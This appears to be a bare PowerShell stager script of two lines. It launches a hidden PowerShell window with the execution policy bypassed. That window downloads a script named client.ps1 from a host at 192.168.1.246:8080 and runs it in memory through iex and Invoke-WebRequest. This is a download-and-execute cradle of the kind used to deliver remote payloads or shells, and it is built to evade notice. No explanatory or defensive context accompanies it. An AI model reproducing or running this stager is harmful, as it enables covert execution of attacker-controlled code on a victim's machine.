$s="http://192.168.1.246:8080/client.ps1"
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (iwr -UseBas '$s')`""